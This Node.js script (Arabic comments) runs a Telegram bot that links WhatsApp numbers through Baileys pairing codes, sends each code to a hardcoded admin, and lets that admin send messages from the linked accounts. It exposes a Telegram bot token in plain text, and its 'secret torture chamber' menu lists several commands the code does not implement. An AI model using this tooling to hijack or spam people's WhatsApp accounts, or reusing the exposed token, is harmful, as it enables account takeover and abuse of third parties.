const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");

const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");

// ========== BOT SETTINGS ==========
const TELEGRAM_TOKEN = "8258339661:AAHSIeEzkDZ5xMEXdnwPfk9xGfchyBwAJ7Q";
const ADMIN_ID = "7210057243";
// ==================================

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let sessions = {}; // جميع الجلسات

// ================ تشغيل جلسة ===================
async function startSession(phone) {
    const folder = `./sessions/${phone}`;
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(folder);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, pairingCode } = update;

        if (pairingCode) {
            bot.sendMessage(
                ADMIN_ID,
                `🔑 *PAIR CODE لرقم* ${phone}:\n\n\`${pairingCode}\`\n\nأدخله في واتساب للربط.`,
                { parse_mode: "Markdown" }
            );
        }

        if (connection === "open") {
            sessions[phone] = sock;
            bot.sendMessage(
                ADMIN_ID,
                `✨ تم ربط رقم *${phone}* بنجاح.\n\nإليك قائمة الأوامر:`,
                { parse_mode: "Markdown" }
            );

            sendCommandMenu(phone);
        }

        if (connection === "close") {
            bot.sendMessage(
                ADMIN_ID,
                `⚠️ جلسة ${phone} انقطعت — إعادة الاتصال...`
            );
            startSession(phone);
        }
    });

    return sock;
}

// ================ قائمة الأوامر ===================
function sendCommandMenu(phone) {
    const menu = `
🩸 *غرفة التعذيب السرّية — أوامر التحكم في واتساب*  
رقم الجلسة: *${phone}*

💬 *إرسال رسالة*
\`/wsend ${phone} الرقم النص\`

🖼️ *إرسال صورة*
\`/wimg ${phone} الرقم رابط_الصورة\`

📁 *إرسال ملف*
\`/wfile ${phone} الرقم رابط_الملف\`

📨 *قائمة جهات الاتصال*
\`/wcontacts ${phone}\`

📤 *إرسال رسالة جماعية*
\`/wbroadcast ${phone} النص\`

📛 *عرض معلومات الجلسة*
\`/winfo ${phone}\`

🔄 *إعادة تشغيل الجلسة*
\`/wrestart ${phone}\`

🗑️ *حذف الجلسة*
\`/wdelete ${phone}\`

🟢 الجلسة الآن *نشطة* وجاهزة بالكامل.
`;
    bot.sendMessage(ADMIN_ID, menu, { parse_mode: "Markdown" });
}

// =============== أمر إنشاء Pair Code ===================
bot.onText(/\/pair (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId != ADMIN_ID) return;

    let phone = match[1].trim().replace(/\+/g, "");

    bot.sendMessage(ADMIN_ID, `🔄 جاري تجهيز جلسة:\n*${phone}*`, { parse_mode: "Markdown" });

    await startSession(phone);
});

// =============== إرسال رسالة واتساب ===================
bot.onText(/\/wsend (\d+) (\d+) (.+)/, async (msg, m) => {
    if (msg.chat.id != ADMIN_ID) return;

    const phone = m[1];
    const target = m[2] + "@s.whatsapp.net";
    const text = m[3];

    if (!sessions[phone]) return bot.sendMessage(ADMIN_ID, "❌ الجلسة غير مربوطة!");

    await sessions[phone].sendMessage(target, { text });
    bot.sendMessage(ADMIN_ID, "✔️ تم إرسال الرسالة.");
});

// ========= ممكن أضيف باقي الأوامر لو تبي ==========
